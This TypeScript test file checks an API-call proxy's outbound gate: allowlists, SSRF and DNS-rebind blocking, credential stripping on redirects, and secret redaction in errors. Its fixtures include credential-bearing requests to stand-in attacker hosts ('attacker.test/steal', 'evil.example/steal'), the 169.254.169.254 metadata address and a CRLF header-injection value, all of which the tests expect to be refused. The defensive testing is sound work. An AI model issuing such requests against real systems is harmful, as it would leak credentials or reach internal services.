// SPDX-License-Identifier: Apache-2.0

/**
 * `fetchApiCall` — the outbound half every api_call path shares (platform
 * proxy, sidecar, local CLI): the initial-target gate (allowlist + SSRF + DNS
 * rebind, a literal declared host exempt when its network's operator allows it), the
 * credential rule across redirects, the address pin and the deadline.
 */

import { describe, it, expect, mock, afterEach } from "bun:test";
import {
  API_CALL_TIMEOUT_MS,
  classifyApiCallFailure,
  fetchApiCall,
  HOP_BY_HOP_HEADERS,
  ApiCallRefusedError,
  skipsSsrfFloor,
  type FetchApiCallOptions,
} from "../../src/resolvers/api-call-engine.ts";
import { URL_POLICY_REFUSAL_CODE } from "../../src/resolvers/api-call-failure-codes.ts";
import { InvalidHeaderValueError } from "@appstrate/afps-shared/delivery-http";

const publicResolver = async () => ["203.0.113.7"];
const internalResolver = async () => ["10.0.0.5"];

/** `fetchApiCall` with the gate of one branch; resolves to the refusal or `null` when sent. */
async function gate(
  url: string,
  opts: Partial<FetchApiCallOptions> & { declaredUris?: readonly string[] },
): Promise<ApiCallRefusedError | null> {
  const fetchFn = mock(async () => new Response("ok")) as unknown as typeof fetch;
  const declaredUris = opts.declaredUris ?? [];
  const allowAllUris = opts.allowAllUris ?? false;
  try {
    await fetchApiCall({
      url,
      init: { method: "GET" },
      authorizedUris: [],
      declaredUris,
      allowAllUris,
      credentialHeaders: [],
      integrationId: "i",
      fetchFn,
      // The operator half granted, unless a test withholds it: the manifest half is under test.
      internalHost: () => true,
      ...opts,
      credentialFields: opts.credentialFields ?? {},
      targetHost: opts.targetHost ?? new URL(url).hostname,
    });
    return null;
  } catch (err) {
    if (err instanceof ApiCallRefusedError) return err;
    throw err;
  }
}

describe("fetchApiCall — a transport error", () => {
  const bunError = (message = "Unable to connect. Is the computer able to access the url?") =>
    Object.assign(new Error(message), {
      name: "ConnectionRefused",
      path: "https://api.example.com/v1?key=SeCrEt-path-7",
    });

  /** The error `fetchApiCall` rejects with when the transport throws `thrown`. */
  const sendFailing = (thrown: Error, credentialFields: Record<string, string> = {}) =>
    fetchApiCall({
      url: "https://api.example.com/v1",
      init: { method: "GET" },
      authorizedUris: [],
      declaredUris: [],
      allowAllUris: true,
      credentialHeaders: [],
      internalHost: () => false,
      integrationId: "i",
      fetchFn: (async () => {
        throw thrown;
      }) as unknown as typeof fetch,
      resolveHost: publicResolver,
      targetHost: "api.example.com",
      credentialFields,
    }).then(
      () => null,
      (e: unknown) => e,
    );

  it("is rebuilt without the URL Bun keeps on `.path` on a templated call", async () => {
    const out = (await sendFailing(bunError(), { api_key: "SeCrEt-path-7" })) as Error;
    expect(out.name).toBe("ConnectionRefused");
    expect(out.message).toContain("Unable to connect");
    expect(JSON.stringify({ ...out })).not.toContain("SeCrEt-path-7");
  });

  it.each(["ConnectionRefused", "ECONNREFUSED"])(
    "keeps the system code %s on a templated call",
    async (systemCode) => {
      const refused = Object.assign(bunError("refused SeCrEt-path-7"), { code: systemCode });
      const out = await sendFailing(refused, { api_key: "SeCrEt-path-7" });
      expect(classifyApiCallFailure(out)).toMatchObject({
        code: "upstream_unreachable",
        systemCode,
        message: "refused {{api_key}}",
      });
    },
  );

  it("drops a code that is no system code on a templated call", async () => {
    const odd = Object.assign(bunError(), { code: "SeCrEt-path-7" });
    const out = await sendFailing(odd, { api_key: "x" });
    expect(classifyApiCallFailure(out).systemCode).toBeUndefined();
  });

  it("drops a system-code-shaped code that holds a credential value", async () => {
    const odd = Object.assign(bunError(), { code: "sk_live_abc" });
    const out = await sendFailing(odd, { api_key: "sk_live_abc" });
    expect(classifyApiCallFailure(out).systemCode).toBeUndefined();
  });

  it("is rethrown untouched on an untemplated call", async () => {
    const err = bunError();
    expect(await sendFailing(err)).toBe(err);
  });

  it("scrubs the longest value first, so a value containing another is not half-leaked", async () => {
    const out = (await sendFailing(bunError("failed at https://x.example/?k=abcdefgh abcdefgh"), {
      a: "abc",
      b: "abcdefgh",
    })) as Error;
    expect(out.message).toBe("failed at x.example {{b}}");
  });
});

describe("redirect loop error", () => {
  it("names the redacted host, never the substituted URL", async () => {
    const secret = "SeCrEt-loop-42";
    const url = `https://api.acme.com/v1?key=${secret}`;
    const err = await fetchApiCall({
      url,
      init: { method: "GET" },
      fetchFn: (async (u: string) =>
        new Response(null, { status: 302, headers: { location: u } })) as unknown as typeof fetch,
      authorizedUris: ["https://api.acme.com/**"],
      declaredUris: ["https://api.acme.com/**"],
      allowAllUris: false,
      credentialHeaders: [],
      internalHost: () => false,
      integrationId: "i",
      resolveHost: publicResolver,
      targetHost: "api.acme.com",
      credentialFields: { api_key: secret },
    }).then(
      () => null,
      (e: Error) => e,
    );
    expect(err?.message).toContain("Too many redirects");
    expect(err!.message).toContain("api.acme.com");
    expect(err!.message).not.toContain(secret);
  });
});

describe("fetchApiCall — initial-target gate per branch", () => {
  it("allow_all: refuses a hostname resolving into a blocked range", async () => {
    const err = await gate("https://rebind.example/x", {
      allowAllUris: true,
      resolveHost: internalResolver,
    });
    expect(err?.kind).toBe("ssrf");
  });

  it("allow_all: an unresolvable host is `unresolvable`, host redacted to itself", async () => {
    const err = await gate("https://gone.example/secret?token=x", {
      allowAllUris: true,
      resolveHost: async () => {
        throw new Error("ENOTFOUND");
      },
    });
    expect(err?.kind).toBe("unresolvable");
    expect(err!.message).toContain("gone.example");
    expect(err!.message).not.toContain("token");
  });

  it("no allowlist and no allow_all: every target is refused before any DNS work", async () => {
    const resolveHost = mock(publicResolver);
    const err = await gate("https://ok.example/x", { resolveHost });
    expect(err?.kind).toBe("not_authorized");
    expect(resolveHost).not.toHaveBeenCalled();
  });

  it("glob-matched allowlist host stays behind the SSRF gate", async () => {
    const err = await gate("https://rebind.example/x", {
      authorizedUris: ["https://**"],
      declaredUris: ["https://**"],
      resolveHost: internalResolver,
    });
    expect(err?.kind).toBe("ssrf");
  });

  it("a literal host the operator allows skips the SSRF gate", async () => {
    const resolveHost = mock(internalResolver);
    const err = await gate("https://intranet.corp/api", {
      authorizedUris: ["https://intranet.corp/**"],
      declaredUris: ["https://intranet.corp/**"],
      resolveHost,
    });
    expect(err).toBeNull();
    expect(resolveHost).not.toHaveBeenCalled();
  });

  it("under allow_all_uris no declared host is exempt: the caller picks the host", async () => {
    const err = await gate("https://intranet.corp/api", {
      allowAllUris: true,
      declaredUris: ["https://intranet.corp/**"],
      resolveHost: internalResolver,
    });
    expect(err?.kind).toBe("ssrf");
  });

  it("a literal host the operator does not allow stays behind the SSRF gate", async () => {
    const err = await gate("https://intranet.corp/api", {
      authorizedUris: ["https://intranet.corp/**"],
      declaredUris: ["https://intranet.corp/**"],
      internalHost: () => false,
      resolveHost: internalResolver,
    });
    expect(err?.kind).toBe("ssrf");
  });

  it("a host the operator allows is still gated unless the manifest names it literally", async () => {
    const operator = { internalHost: (host: string) => host === "idp.internal" };
    const cases: Array<Partial<FetchApiCallOptions>> = [
      { allowAllUris: true },
      { allowAllUris: true, declaredUris: ["https://idp.internal/**"] },
      { authorizedUris: ["https://*.internal/**"], declaredUris: ["https://*.internal/**"] },
      {
        authorizedUris: ["https://idp.internal/**"],
        declaredUris: ["https://{$credential.host}/**"],
      },
    ];
    for (const branch of cases) {
      const err = await gate("https://idp.internal/x", {
        ...operator,
        ...branch,
        resolveHost: internalResolver,
      });
      expect(err?.kind).toBe("ssrf");
    }
    const named = await gate("https://idp.internal/x", {
      ...operator,
      authorizedUris: ["https://idp.internal/**"],
      declaredUris: ["https://idp.internal/**"],
      resolveHost: internalResolver,
    });
    expect(named).toBeNull();
  });

  it("a redirect to a host the operator allows is gated unless the manifest names it", async () => {
    const send = (declaredUris: string[]) => {
      const fetchFn = mock(async (url: string | URL) =>
        String(url).startsWith("https://api.example/")
          ? new Response(null, { status: 302, headers: { location: "https://idp.internal/x" } })
          : new Response("internal"),
      ) as unknown as typeof fetch;
      return gate("https://api.example/start", {
        authorizedUris: declaredUris,
        declaredUris,
        internalHost: (host) => host === "idp.internal",
        fetchFn,
        resolveHost: async (host) => (host === "idp.internal" ? ["10.0.0.5"] : ["203.0.113.7"]),
      });
    };
    expect((await send(["https://api.example/**", "https://*.internal/**"]))?.kind).toBe("ssrf");
    expect(await send(["https://api.example/**", "https://idp.internal/**"])).toBeNull();
  });

  it("a host rendered from a connection value is never pinned (SSRF gate applies)", async () => {
    const resolveHost = mock(internalResolver);
    const err = await gate("https://intranet.corp/api", {
      authorizedUris: ["https://intranet.corp/**"],
      declaredUris: ["https://{$credential.host}/**"],
      resolveHost,
    });
    expect(err?.kind).toBe("ssrf");
    expect(resolveHost).toHaveBeenCalled();
  });

  it("a rendered IP-literal internal host is literal-blocked", async () => {
    for (const url of ["https://169.254.169.254/latest", "https://127.0.0.1/x"]) {
      const host = new URL(url).host;
      const err = await gate(url, {
        authorizedUris: [`https://${host}/**`],
        declaredUris: ["https://{$credential.host}/**", "{$credential.site_url}/**"],
        resolveHost: publicResolver,
      });
      expect(err?.kind).toBe("ssrf");
    }
  });

  it("a malformed entry authorizes nothing: the injected credential is never sent", async () => {
    const fetchFn = mock(async () => new Response("ok")) as unknown as typeof fetch;
    for (const pattern of ["https://@x:y@**/**", "https://%2A%2A\\**"]) {
      const err = await gate("https://attacker.test/steal", {
        init: { method: "GET", headers: { "X-Api-Key": "SECRET" } },
        credentialHeaders: ["X-Api-Key"],
        authorizedUris: [pattern],
        declaredUris: [pattern],
        fetchFn,
        resolveHost: publicResolver,
      });
      expect(err?.kind).toBe("not_authorized");
    }
    expect(fetchFn).not.toHaveBeenCalled();
  });

  it("off-allowlist target is refused before any DNS work", async () => {
    const resolveHost = mock(publicResolver);
    const err = await gate("https://evil.example/x", {
      authorizedUris: ["https://api.example.com/**"],
      declaredUris: ["https://api.example.com/**"],
      resolveHost,
    });
    expect(err?.kind).toBe("not_authorized");
    expect(resolveHost).not.toHaveBeenCalled();
  });

  it("a declared list the connection does not render refuses every target (#1627)", async () => {
    const resolveHost = mock(publicResolver);
    const err = await gate("https://attacker.example/steal", {
      declaredUris: ["{$credential.site_url}/**"],
      resolveHost,
    });
    expect(err?.kind).toBe("not_authorized");
    expect(resolveHost).not.toHaveBeenCalled();
  });

  it("a declared literal host is not trusted under allow_all_uris", async () => {
    const err = await gate("https://intranet.corp/api", {
      allowAllUris: true,
      declaredUris: ["https://intranet.corp/**"],
      resolveHost: internalResolver,
    });
    expect(err?.kind).toBe("ssrf");
  });

  it("an off-allowlist refusal names the declared entries, never a rendered one", async () => {
    const hook = "https://hooks.example.com/services/T000/B000/SECRETTOKEN";
    const err = await gate("https://example.com/", {
      authorizedUris: [hook],
      declaredUris: ["{$credential.webhook_url}"],
      resolveHost: publicResolver,
    });
    expect(err!.message).toContain("{$credential.webhook_url}");
    expect(err!.message).not.toContain("SECRETTOKEN");
  });

  it("IP-literal internal target is literal-blocked before DNS", async () => {
    const resolveHost = mock(publicResolver);
    const err = await gate("https://169.254.169.254/latest/meta-data", {
      allowAllUris: true,
      resolveHost,
    });
    expect(err?.kind).toBe("ssrf");
    expect(resolveHost).not.toHaveBeenCalled();
  });

  it("public-resolving target proceeds on every gated branch", async () => {
    const branches: Array<{ allowAllUris?: boolean; authorizedUris?: string[] }> = [
      { allowAllUris: true },
      { authorizedUris: ["https://**"] },
    ];
    for (const opts of branches) {
      const err = await gate("https://ok.example/x", {
        ...opts,
        declaredUris: opts.authorizedUris ?? [],
        resolveHost: publicResolver,
      });
      expect(err).toBeNull();
    }
  });
});

describe("fetchApiCall — credentials across a redirect", () => {
  /** Headers each hop received; the first hop redirects to `to`. */
  async function hopHeaders(
    to: string,
    policy: Pick<FetchApiCallOptions, "authorizedUris" | "allowAllUris">,
    status = 302,
  ): Promise<Headers[]> {
    const seen: Headers[] = [];
    const fetchFn = (async (_url: string, init?: RequestInit) => {
      seen.push(new Headers(init?.headers));
      return seen.length === 1
        ? new Response(null, { status, headers: { location: to } })
        : new Response("ok");
    }) as unknown as typeof fetch;
    await fetchApiCall({
      url: "https://api.dropboxapi.com/2/files/download",
      init: {
        method: "GET",
        headers: { Authorization: "Bearer tok", "X-Api-Key": "k", Cookie: "s=1" },
      },
      ...policy,
      declaredUris: policy.authorizedUris,
      credentialHeaders: ["Authorization", "X-Api-Key"],
      internalHost: () => false,
      integrationId: "i",
      targetHost: "api.example.com",
      credentialFields: {},
      fetchFn,
      resolveHost: publicResolver,
    });
    return seen;
  }

  it("keeps them on a cross-origin hop the allowlist names (Dropbox api. -> content.)", async () => {
    const [, second] = await hopHeaders("https://content.dropboxapi.com/2/files/download", {
      authorizedUris: ["https://api.dropboxapi.com/**", "https://content.dropboxapi.com/**"],
      allowAllUris: false,
    });
    expect(second!.get("authorization")).toBe("Bearer tok");
    expect(second!.get("x-api-key")).toBe("k");
    expect(second!.get("cookie")).toBe("s=1");
  });

  it("strips them on an origin change no allowlist authorizes", async () => {
    const [, second] = await hopHeaders("https://cdn.example.net/blob", {
      authorizedUris: [],
      allowAllUris: true,
    });
    expect(second!.get("authorization")).toBeNull();
    expect(second!.get("x-api-key")).toBeNull();
    expect(second!.get("cookie")).toBeNull();
  });

  it("strips them on a hop a wildcard reaches past its registrable domain", async () => {
    const authorizedUris = ["https://api.dropboxapi.com/**", "https://*.amazonaws.com/**"];
    const [, beyond] = await hopHeaders("https://sqs.us-east-1.amazonaws.com/queue", {
      authorizedUris,
      allowAllUris: false,
    });
    expect(beyond!.get("authorization")).toBeNull();
    expect(beyond!.get("cookie")).toBeNull();
    const [, inside] = await hopHeaders("https://sts.amazonaws.com/", {
      authorizedUris,
      allowAllUris: false,
    });
    expect(inside!.get("authorization")).toBe("Bearer tok");
  });

  it("refuses a hop off the allowlist instead of following it", async () => {
    const err = await hopHeaders("https://evil.example/steal", {
      authorizedUris: ["https://api.dropboxapi.com/**"],
      allowAllUris: false,
    }).catch((e: unknown) => e);
    expect(classifyApiCallFailure(err)).toMatchObject({
      code: "unauthorized_target",
      redirect: true,
    });
  });

  it("classifies a hop to a host with no DNS answer as unresolvable, not as SSRF", async () => {
    const fetchFn = mock(
      async () => new Response(null, { status: 302, headers: { location: "https://gone.test/" } }),
    ) as unknown as typeof fetch;
    const err = await fetchApiCall({
      url: "https://api.example.com/x",
      init: { method: "GET" },
      authorizedUris: ["https://api.example.com/**", "https://gone.test/**"],
      declaredUris: ["https://api.example.com/**", "https://gone.test/**"],
      allowAllUris: false,
      credentialHeaders: [],
      internalHost: () => false,
      integrationId: "i",
      targetHost: "api.example.com",
      credentialFields: {},
      fetchFn,
      resolveHost: async (host) => {
        if (host === "gone.test") throw new Error("ENOTFOUND");
        return ["203.0.113.7"];
      },
    }).catch((e: unknown) => e);
    expect(classifyApiCallFailure(err)).toMatchObject({
      code: "upstream_unresolvable",
      redirect: true,
    });
  });

  it("returns a streaming body's redirect unfollowed", async () => {
    const fetchFn = mock(
      async () => new Response(null, { status: 307, headers: { location: "https://x.example/" } }),
    ) as unknown as typeof fetch;
    const { response, hops } = await fetchApiCall({
      url: "https://api.example.com/upload",
      init: { method: "PUT", body: new Blob(["x"]).stream(), duplex: "half" } as RequestInit,
      authorizedUris: ["https://api.example.com/**", "https://x.example/**"],
      declaredUris: ["https://api.example.com/**", "https://x.example/**"],
      allowAllUris: false,
      credentialHeaders: [],
      internalHost: () => false,
      integrationId: "i",
      targetHost: "api.example.com",
      credentialFields: {},
      fetchFn,
      resolveHost: publicResolver,
    });
    expect(response.status).toBe(307);
    expect(hops).toBe(0);
    expect(fetchFn).toHaveBeenCalledTimes(1);
  });
});

describe("fetchApiCall — transport", () => {
  const realFetch = globalThis.fetch;
  afterEach(() => {
    globalThis.fetch = realFetch;
  });

  it("connects to the validated address by default, keeping the logical Host", async () => {
    let seen: { url: string; host: string | null } | null = null;
    globalThis.fetch = (async (url: string, init?: RequestInit) => {
      seen = { url, host: new Headers(init?.headers).get("host") };
      return new Response("ok");
    }) as unknown as typeof fetch;
    const { finalUrl } = await fetchApiCall({
      url: "https://api.example.com/v1",
      init: { method: "GET" },
      authorizedUris: ["https://api.example.com/**"],
      declaredUris: ["https://api.example.com/**"],
      allowAllUris: false,
      credentialHeaders: [],
      internalHost: () => false,
      integrationId: "i",
      targetHost: "api.example.com",
      credentialFields: {},
      resolveHost: publicResolver,
    });
    expect(seen!.url).toContain("203.0.113.7");
    expect(seen!.host).toBe("api.example.com");
    expect(finalUrl).toBe("https://api.example.com/v1");
  });

  /** The headers the upstream receives for `init`, `X-Api-Key` being the credential. */
  async function sentHeaders(init: RequestInit): Promise<Headers> {
    let seen: Headers | null = null;
    const fetchFn = (async (_url: string, sent?: RequestInit) => {
      seen = new Headers(sent?.headers);
      return new Response("ok");
    }) as unknown as typeof fetch;
    await fetchApiCall({
      url: "https://api.example.com/v1",
      init,
      authorizedUris: ["https://api.example.com/**"],
      declaredUris: ["https://api.example.com/**"],
      allowAllUris: false,
      credentialHeaders: ["X-Api-Key"],
      internalHost: () => false,
      integrationId: "i",
      targetHost: "api.example.com",
      credentialFields: {},
      fetchFn,
      resolveHost: publicResolver,
    });
    return seen!;
  }

  it("never forwards a caller-supplied Host, even on an unpinned hop", async () => {
    const seen = await sentHeaders({
      method: "GET",
      headers: { Host: "other.example", "X-Api-Key": "k" },
    });
    expect(seen.get("host")).toBeNull();
    expect(seen.get("x-api-key")).toBe("k");
  });

  it("never forwards hop-by-hop, Connection-named or framing headers; the credential stays", async () => {
    const seen = await sentHeaders({
      method: "POST",
      body: "hello",
      headers: {
        "Transfer-Encoding": "chunked",
        "Content-Length": "3",
        Connection: "x-foo, X-Api-Key",
        "X-Foo": "1",
        Upgrade: "websocket",
        "Keep-Alive": "timeout=5",
        TE: "trailers",
        "Proxy-Authorization": "Basic eDp5",
        "X-Normal": "yes",
        "X-Api-Key": "k",
      },
    });
    expect([...seen.keys()].sort()).toEqual(["x-api-key", "x-normal"]);
  });

  it("never forwards a caller's Content-Length, even on a stream fetch cannot measure", async () => {
    const body = new Blob(["hello world"]).stream();
    const seen = await sentHeaders({ method: "POST", body, headers: { "Content-Length": "5" } });
    expect(seen.get("content-length")).toBeNull();
  });

  it("sends a stream's trusted `bodyLength` on the wire, with exactly that many bytes", async () => {
    const payload = "hello world";
    const wire = Promise.withResolvers<string>();
    let buffered = "";
    const server = Bun.listen({
      hostname: "127.0.0.1",
      port: 0,
      socket: {
        data(socket, chunk) {
          buffered += chunk.toString("latin1");
          const end = buffered.indexOf("\r\n\r\n");
          const length = /\r\ncontent-length: *(\d+)/i.exec(buffered.slice(0, end))?.[1];
          if (end < 0 || buffered.length - end - 4 < Number(length ?? Infinity)) return;
          socket.end("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
          wire.resolve(buffered);
        },
      },
    });
    try {
      await fetchApiCall({
        url: "https://api.example.com/v1",
        init: {
          method: "POST",
          // Not a Blob stream, whose size Bun would know.
          body: new ReadableStream({
            start(controller) {
              controller.enqueue(new TextEncoder().encode(payload));
              controller.close();
            },
          }),
          headers: { "Content-Length": "5" },
          duplex: "half",
        } as RequestInit,
        bodyLength: payload.length,
        internalHost: () => false,
        authorizedUris: ["https://api.example.com/**"],
        declaredUris: ["https://api.example.com/**"],
        allowAllUris: false,
        credentialHeaders: [],
        integrationId: "i",
        targetHost: "api.example.com",
        credentialFields: {},
        fetchFn: ((_url: string, init?: RequestInit) =>
          fetch(`http://127.0.0.1:${server.port}/v1`, init)) as unknown as typeof fetch,
        resolveHost: publicResolver,
      });
      const [head, body] = (await wire.promise).split("\r\n\r\n");
      expect(head!.toLowerCase().split("\r\n")).toContain(`content-length: ${payload.length}`);
      expect(body).toBe(payload);
    } finally {
      server.stop(true);
    }
  });

  it(`bounds the exchange at API_CALL_TIMEOUT_MS (${API_CALL_TIMEOUT_MS} ms) AND the caller's signal`, async () => {
    const caller = new AbortController();
    let signal: AbortSignal | undefined;
    const fetchFn = (async (_url: string, init?: RequestInit) => {
      signal = init?.signal ?? undefined;
      return new Response("ok");
    }) as unknown as typeof fetch;
    await fetchApiCall({
      url: "https://api.example.com/v1",
      init: { method: "GET", signal: caller.signal },
      authorizedUris: [],
      declaredUris: [],
      allowAllUris: true,
      credentialHeaders: [],
      internalHost: () => false,
      integrationId: "i",
      targetHost: "api.example.com",
      credentialFields: {},
      fetchFn,
      resolveHost: publicResolver,
    });
    expect(API_CALL_TIMEOUT_MS).toBe(30_000);
    expect(signal).not.toBe(caller.signal);
    expect(signal!.aborted).toBe(false);
    caller.abort();
    expect(signal!.aborted).toBe(true);
  });
});

describe("classifyApiCallFailure", () => {
  it("names what every path maps: refusal, redirect, timeout, transport", () => {
    expect(classifyApiCallFailure(new ApiCallRefusedError("unresolvable", "m"))).toEqual({
      code: "upstream_unresolvable",
      redirect: false,
      message: "m",
    });
    expect(classifyApiCallFailure(new ApiCallRefusedError("ssrf", "m", true))).toEqual({
      code: "blocked_target",
      redirect: true,
      message: "m",
    });
    expect(classifyApiCallFailure(new DOMException("late", "TimeoutError")).code).toBe(
      "upstream_timeout",
    );
    expect(
      classifyApiCallFailure(Object.assign(new Error("refused"), { code: "ECONNREFUSED" })),
    ).toEqual({
      code: "upstream_unreachable",
      redirect: false,
      message: "refused",
      systemCode: "ECONNREFUSED",
    });
  });

  // The one vocabulary of the three paths: a change here is a change of every path's wire.
  it("pins each kind's shared code", () => {
    const pinned = [
      [new ApiCallRefusedError("not_authorized", "m"), "unauthorized_target"],
      [new ApiCallRefusedError("ssrf", "m"), "blocked_target"],
      [new ApiCallRefusedError("unresolvable", "m"), "upstream_unresolvable"],
      [new InvalidHeaderValueError("X-Api-Key"), "credential_unusable"],
      [new DOMException("late", "TimeoutError"), "upstream_timeout"],
      [new Error("reset"), "upstream_unreachable"],
    ] as const;
    for (const [err, code] of pinned) expect(classifyApiCallFailure(err).code).toBe(code);
    expect(URL_POLICY_REFUSAL_CODE).toEqual({
      unrendered: "unauthorized_target",
      unauthorized: "unauthorized_target",
      exfiltration: "credential_exfiltration_refused",
      beyond_bound: "credential_exfiltration_refused",
    });
  });
});

describe("fetchApiCall — a header value that is no HTTP field value", () => {
  const secret = "SECRETKEY";
  const send = (value: string | Headers, credentialFields: Record<string, string>) => {
    const fetchFn = mock(async () => new Response("ok"));
    const sent = fetchApiCall({
      url: "https://api.example.com/v1",
      init: { method: "GET", headers: typeof value === "string" ? { "X-Api-Key": value } : value },
      authorizedUris: ["https://api.example.com/**"],
      declaredUris: ["https://api.example.com/**"],
      allowAllUris: false,
      credentialHeaders: ["X-Api-Key"],
      internalHost: () => false,
      integrationId: "i",
      fetchFn: fetchFn as unknown as typeof fetch,
      resolveHost: publicResolver,
      targetHost: "api.example.com",
      credentialFields,
    }).then(
      () => null,
      (e: unknown) => e,
    );
    return { sent, fetchFn };
  };

  // Bun's `Headers` TypeError quotes the value in full; it used to escape before the scrub.
  for (const value of [`${secret}\r\nX-Evil: 1`, `${secret}\u20ac`, `${secret}\u0000`]) {
    for (const fields of [{}, { api_key: value }] as Record<string, string>[]) {
      it(`refuses ${JSON.stringify(value.slice(secret.length))} unsent, naming the header only (${Object.keys(fields).length ? "templated" : "untemplated"})`, async () => {
        const { sent, fetchFn } = send(value, fields);
        const err = (await sent) as Error;
        expect(err).toBeInstanceOf(InvalidHeaderValueError);
        expect(err.message).toContain("X-Api-Key");
        expect(JSON.stringify([err.message, { ...err }])).not.toContain(secret);
        expect(fetchFn).not.toHaveBeenCalled();
        expect(classifyApiCallFailure(err)).toMatchObject({
          code: "credential_unusable",
          redirect: false,
        });
      });
    }
  }

  it("checks a `Headers` instance too, which accepts a control character", async () => {
    const { sent, fetchFn } = send(new Headers({ "X-Api-Key": `${secret}\u0001` }), {});
    expect(await sent).toBeInstanceOf(InvalidHeaderValueError);
    expect(fetchFn).not.toHaveBeenCalled();
  });
});

describe("fetchApiCall — the target's host in a message", () => {
  it("is the caller's `targetHost`, never the rendered host", async () => {
    const err = await gate("https://tenant-secret.example.com/v1", {
      authorizedUris: ["https://tenant-secret.example.com/**"],
      declaredUris: ["https://{$credential.sub}.example.com/**"],
      resolveHost: async () => [],
      targetHost: "{{sub}}.example.com",
    });
    expect(err?.kind).toBe("unresolvable");
    expect(err?.message).toBe("Target host could not be resolved ({{sub}}.example.com)");
  });
});

describe("skipsSsrfFloor (shared with the runner egress listeners, #1819)", () => {
  const rule = {
    declaredUris: ["https://intranet.corp/**", "https://10.0.0.5:8443", "https://*.corp/**"],
    allowAllUris: false,
    internalHost: (h: string) => ["intranet.corp", "10.0.0.5", "wild.corp"].includes(h),
  };

  it("exempts a host the declared list names literally and the operator accepts", () => {
    expect(skipsSsrfFloor("intranet.corp", rule)).toBe(true);
    expect(skipsSsrfFloor("10.0.0.5", rule)).toBe(true);
  });

  it("never exempts a glob-matched, unlisted or trailing-dot host, nor under allow_all_uris", () => {
    expect(skipsSsrfFloor("wild.corp", rule)).toBe(false);
    expect(skipsSsrfFloor("other.corp", { ...rule, internalHost: () => true })).toBe(false);
    expect(skipsSsrfFloor("intranet.corp", { ...rule, internalHost: () => false })).toBe(false);
    expect(skipsSsrfFloor("intranet.corp.", { ...rule, internalHost: () => true })).toBe(false);
    expect(skipsSsrfFloor("intranet.corp", { ...rule, allowAllUris: true })).toBe(false);
  });
});

describe("HOP_BY_HOP_HEADERS", () => {
  it("includes the canonical RFC 7230 hop-by-hop set", () => {
    for (const h of [
      "connection",
      "keep-alive",
      "proxy-connection",
      "proxy-authenticate",
      "proxy-authorization",
      "te",
      "trailer",
      "transfer-encoding",
      "upgrade",
    ]) {
      expect(HOP_BY_HOP_HEADERS.has(h)).toBe(true);
    }
  });
});
